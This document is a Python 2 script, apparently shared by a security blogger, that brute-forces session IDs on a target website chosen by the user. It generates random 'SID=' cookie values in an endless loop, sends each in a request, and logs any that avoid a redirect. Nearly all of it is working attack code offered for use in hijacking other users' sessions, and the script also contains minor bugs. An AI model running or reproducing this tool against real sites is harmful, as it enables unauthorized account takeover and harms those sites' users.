#!/usr/bin/python

import httplib, urllib, gzip, StringIO, random

print """
 _____               _            _____    _______            _            
/  ___|             (_)          |_   _|  | | ___ \          | |           
\ `--.  ___  ___ ___ _  ___  _ __  | |  __| | |_/ /_ __ _   _| |_ ___ _ __ 
 `--. \/ _ \/ __/ __| |/ _ \| '_ \ | | / _` | ___ \ '__| | | | __/ _ \ '__|
/\__/ /  __/\__ \__ \ | (_) | | | || || (_| | |_/ / |  | |_| | ||  __/ |   
\____/ \___||___/___/_|\___/|_| |_\___/\__,_\____/|_|   \__,_|\__\___|_|   
                                                                           
	Author: Muhammad Adeel aka Stoker
	Email:	Chaudhary1337@gmail.com
	Blog:	http://urdusecurity.blogspot.com

"""
# Target Website Here
Target = raw_input('Enter Target Website to Brute Force [Ex: google.com ]: ')
# Function Defining
def UrduSecurity(attack):
	print "[*] Please Wait - We are Trying Following Session id => ",attack
	conn = httplib.HTTPConnection(Target)
	headers = {"Host": "urdusecurity.blogspot.com",
	           "User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
	           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	           "Accept-Language:": "en-us,en;q=0.5",
	           "Accept-Encoding": "gzip, deflate",
	           "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
	           "Proxy-Connection": "keep-alive",
	           "Referer": "http://urdusecurity.blogspot.com",
	           "Pragma": "no-cache",
	           "Cookie": attack, }
	conn.request("GET", "/home", "", headers)
	response = conn.getresponse()
	print response.status, response.reason
	comparametersseddata = response.read()
	comparameterssedstream = StringIO.StringIO(comparametersseddata)  
	gzipper = gzip.GzipFile(fileobj=comparameterssedstream)      
	data = gzipper.read()
	if "window.location.href" in data:
		print "[-] Sorry, Nothing Found !."
	else:
		w = open('Session_Id_Bruter.txt','a')
		w.write(attack)
		print "[+] Done, Thanks For Using Session ID Brute Forcer."
# Generating Session ID
parameter = "SID="
Max_Length_of_Random_Num = 25
data_all = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ"
var = len(data_all)
PayLoad = ''
while 1:
    if len(PayLoad) == Max_Length_of_Random_Num:
        final = str(parameter)+str(PayLoad)
        UrduSecurity(final)
        PayLoad = ''
    temp_var = random.randint(0, var)
    temp_var2 = temp_var+1
    PayLoad += data_all[temp_var:-var+temp_var2]
